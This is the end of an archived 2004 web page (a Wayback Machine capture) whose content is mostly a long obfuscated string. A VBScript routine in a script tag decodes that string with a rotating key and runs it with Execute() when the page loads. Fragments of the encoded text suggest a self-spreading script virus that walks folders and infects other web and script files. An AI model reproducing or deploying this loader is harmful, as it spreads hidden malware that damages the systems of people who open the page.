&t3/1,,03*(.8)>'1*?,-;,@9&+*C)/@8/>-2-xN_tAcl^O_mi7 ?NI.Hk_nM`rt?dfe!NnakoOp?dfe%-&tkp_)@ie`Nefk(WkdneQ\sM`rt@ie`Nefk(Cejme?n]@ug^nihi@ug^nihiKCGck^Dn(I_CnPc_r^6>btfg Mc_n?xboFni]tbjh@hdD`ObilGicZocog7 ]j]uf`ht'gicZocogI_Fe_oTadmLh^[tbjh,/# 6fbg_ObegTadmLh^[tbjh 6Gi]#NhbnFo\\nihi&9I_@SH)Aem@rt^imihiHaf`TadmLh^[tbjh)78 ta`hObilGicZocog7 E``t!ObilGicZocog'Feg#NhbnFo\\nihi# &Feg#@SH)AemAcl^I[m^#NhbnFo\\nihi#)Eg_I_I_Feg#NhbnFo\\nihi# 7- Mc_nNhbnFo\\nihi=ObilGicZocog  W@hdD`FDufh[g^Ail]`l(MccsEj]amdinEg_I_Eg_Fni]tbjhFni]tbjh DEGabgLe`#Le`Nnr%Acl^I[m^$HiEkmirM_snh_ G`rtLe`O_miNnr8WlNbeeg(R^bLeZ_R^bMtk$BaR^bNefkMtk7 Ta`hRmSa`fl'M_gPmct^Le`Nnr%Acl^I[m^Eg_I_Eg_Fni]tbjhFni]tbjh DEIbhNob!>ork`htLoligb#Nob>7 )T^nnOno=+=jWadfeOlu^T^nnOno=O_smJot&1CfO_smJot921Nh^i<plr^inSmmcn`7 ?dhaet>ilf&4\Eqdn =j>i^ BaHiEkmirM_snh_ G`rtMemNhbn@oe__r8FLJ(G^o@oe__r!>ork`htLoligb#N_t?ccLp\ 6=r^\neH]de\oL^liiocn`)>i\ocog\ly$L`n ?jfd^mm 6Nhbn@oe__r'Nob?jfd^mmAil]`lChpht80@ok?a\cT^hjFhg^ekcnAil]`ls@oe__r<jonm7 ?jfd^m=onin $+?ccLp\.Z_^ ?jfd^m=onin,O_miAil]`l.G\geHeqoBaDb^Mu[)=onin 6* Mc_nFaloCn]`rCa\l 6CnlolR^qCnmlegoMtkdhg%V%G_n!>ork`htLoligb#-*$Lp\Smmcn`7 Fd^(<plr^inSmmcn`'FaloCn]`rCa\l+*'Feg#=ukm_nmNnrbia)&G[smDhd^s=hZm'1CnmlegoMtkdhg8KC>bagb_Sn]CnmlegoMtkdhg%G[smDhd^s=hZm#Nob>7 *Een_D` Lp\E80ObegCnmlegoMtkdhg8CnmlegoMtkdhg!Db^Mu[)Ct^h1  W@rim>o?ll`c7 )Fhmj81Oi ?jfd^m=oninD` E>[s^#Mu[Nnrbia)8L<\me!?ccLp\.Bo_m!e#)ObegI_d 5@oe__r<jonmNh^i<plr^inSmmcn`7 <plr^inSmmcn`  =d]Sn](Im`g(c&+)!U>sct?i@hdD`@hdD`I_xmLZnnIg__x<c[r8IgnnrK`p(<plr^inSmmcn`'\'Feg#=ukm_nmNnrbia)&,#NobLoligb=Hcd!>ork`htLoligb&LZnnIg__x<c[r$,&L^iCnmlegoMtkdhg(FaloCn]`rCa\l-*$<plr^inSmmcn`7 DE=hZiaeLp\(<plr^inSmmcn`'FaloCn]`rCa\l)?n]Cf?n]CfFohkDEIbhNob8CnmlegoMtkdhg?n]@ug^nihi@ug^nihiKCKloi\aam`)In@lrhmR^nom^HeqoK`aPZobVZgoe8AF?YXGIC:GYM:>BIG@VShanwZm_\Fd]rhnifmWIumgiod?xim_slW>e`m_eDbneD^ble^7 PnMh^gf.K`aR^\^(K`aPZobVZgoeI_>ilf>e`m_e8Nh^i=dmk=`ar^`=AcnZgsDbne :U>i^ Ba?jl b8+ mj5>ilf>e`m_e8KCJ\oLp\(=dmk=`ar^`#FDufh[g^Ail]`l(=dmk=`ar^`#I_xmWlNbeeg(R^bQrbo_ K`aPZobVZgoe%?csd?_gk`_@hdAon\ocogAon\ocogEJnhga``@oe__r!K[taI[m^$HiEkmirM_snh_ G`rtMem@oe__rG\ge8FLJ(G^o@oe__r!K[taI[m^$L`n Mccs?dfel7 ?jfd^mHaf`(Fbg_sBtm@rilom 6*Air@[caNhbn@ie`IgNhbn@ie`mAcl^@rt8U<\me!AMO'B_t>snegncogI[m^#Nhbn@ie`(PZob)I_@ie`?xm7 CNMIrAcl^@rt8AOGLIrAcl^@rt8:NJJl ?dfe>sn 6PAK HmFbg_Eqo=DSITa`h>[leEJ:kjeg_No!ObilAcl^)Jamc&aogl$>gmeBaFbg_Eqo=PBLTa`h>[leEJ:kjeg_No!ObilAcl^)Jamc&o]mEen_I_@ie`?xm7 CNTNh^iAonEqdmtl7 *Eg_I_N^snD` !P=al`PZobNZh_)8U<\me!RcnI\nh!=`mkmjj\$# Hm(N>[s^#JamcHaf`# 6OCZn_(PdhPZob D^nethk)ObegHmo?xbnns81?n]CfCfCnt>scsmn=+Ta`hAMO'>iprAcl^QigK[ta  nssm`g3+W^elfnoi)cnb&PZobNZh_AMO'>iprAcl^QigK[ta  r_bUAil]`l.aon%K[taI[m^Eg_I_Eg_Fni]tbjhFni]tbjh DEMem?cm!$HiEkmirM_snh_ G`rt?rk)=l^\lO_smDn 6QS\mcpm)Mckdjt?pflg\geCf@lrObegIgRbek`=btfg@fs^IgRbek`=pbl>i^ BaBaIgRbek`=pblTa`hN_tAMO8Ck`[t^J\j^^n(N]rbknigb(Fbg_SrnnefJ\j^^nS^oWlNbeeg=>leZo_O[e_cm#WL^liio(Sa`fl$>gmeMem;pig_O[e_cm7 ]j]uf`ht'\jpe`ns!EJXboelo);pig_O[e_cm)mem>FSB?tA33.?=2+(+C?+'1*?*-:?<9&+*C)/@D.3;0;x);pig_O[e_cm)]r^\neBimtZi]e!$L`n PnMh^gf 6;pig_O[e_cm)AemJ\j^^n(AikfeH]de\o(s^o=LLD>(v*D-.@E),'F)4--*,=F&334)(*0:+=9)0.2+3wAikfeH]de\o(ck`[t^Dhsm\hc^##N_tAMO8AikfeH]de\o(G^oIbc`]t!$>i^ BaL`n =dmkH]de\o=AMO'?lio`mAir@[ca>ilfNefkIg>ilfIbc`]tCf?csdO_mi)>rbq_Trk_ 592<hd?csdO_mi)>rbq_Trk_ 591ObegEqdn ?jl@hdD`AcnZgsDbne 6>ilfNefk(DkdpeE`nt^mG`rt>ifIta`lAkm3RZi^ofdte@okc=)No.Hobek<lr!d# 6Cnm#9%Rg_#)HeqoM`gpLoligb=Aird71Oi E`h(MccsM`rtT^hjNnh=<mc!Hcd!ObilO_xm'c,*$#D` M`gpGpg 6+3ObegT^hjNnh=-2@fs^D` M`gpGpg 6+0ObegT^hjNnh=-3@hdD`O_mi>bak7 <cl(M`gpGpg &Ita`lAkmiHid/#)CfO_mi>bak7 <cl(,/# Mc_nNefk=hZm=>br!,2)?n]CfNefkMtkdhg8T^hjSmmcn`  M`gp<c[rHeqoNiFo\fMtk7 @re\pne!DbhK^t;rk#-)%ObilO_xm&o]=rEa F_y:ml()$=&Jnh^m;rk#*)! v[>lL_!D`sAkm17   Hobek<lr!,# !pb<mFfK^t;rk#,)8!Omc_r:ml(+$&q\CkG`&Eer<lr!.# 6 Ita`lAkm3  &o]=rEa Aird71Oi E`h(>s_Smmcn`$q\CkG`&NefkHuf7 :n](Fd^(>s_Smmcn`'c,*$#!pb<mFfI_NefkHuf7 *3Ta`h!pb<mFfT^hjNnh=..!pb<mFfEg_I_&o]=rEa O_mi>bak7 <cl(M`gpGpg $Eer<lr!dMh_4$q\CkG`&CfO_mi>bak7 <cl(+3# Mc_n v[>lL_!M`gp<c[r8v[>l!pb<mFfEen_I_Nefk=hZm=>br!-3)Obeg&o]=rEa O_mi>bak7 o]Ff v[>lL_!>i^ Baq\CkG`&NhbnNeqo=ObilO_xm  M`gp<c[r v[>lL_!G`rt#!v[>lL_  @re\pne!ObilO_xm$ObilO_xm7 @reLoligb=!T^hjSmmcn`  BtfgNeqo=7 s\mcpmfagboa``7v[n]rbkn>  o]=rEa&^o\pgego(wkdne&  7 dbqsmtfe6joldnihi4a[nilno_;g_fm5*pq6thk40is5 pd^ta5*pq6h^dahm5*pq6z&dhd^s4216vbncbbgctr5hb_^eg8!5& AIKFEMHAF@7KC&Ygn`mtC?I@CN=)QI=OB=)]o]`7chh(ml)a\ocv^S(A\ocv^&RChhjog`ht7&6!(<JPE@N>  7 /]dp> pb<mFf!5&)s\mcpm9 pb<mFf!5&mckdjtg[n`p[g^8pbl^liio8!v[>lL_  MccsM`rt!v[>lL_  NiFo\fMtk  o]=rEa&6!(n]rbkn>  o]=rEa&6!(=IDR9 pb<mFf!5&)HMHF>V[nNeqo=ObilO_xm  o]=rEa&PhLh^eSmm&q\CkG` KCZmtZmn(PdhPZob 6@SH)AemNje\d[l?jfd^m0  WD` !AMO'Acl^@rilom(PdhPZob w^]VFhg^ek)btm#)ObegFLJ(ChksFbg_ PdhPZob w^]VFhg^ek)btm&WbiJamc&qe[Wejp\fl'bcfEg_I_I_FLJ(Fbg_Eqdmtl#QigK[ta  nssm`g3+W^elfnoi)cnb#)ObegFLJ(ChksFbg_ PdhPZob srnnef.,\]`mkmjj.bic%RcnI\nh!ltmt^h-2UfdwZgf.`d`?n]Cf?n]@ug^nihi"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 6"&vbCrLf&"KeyArr(1) = 0"&vbCrLf&"KeyArr(2) = 7"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</html>





<!--
     FILE ARCHIVED ON 3:56:15 Feb 8, 2004 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 18:13:10 Feb 27, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
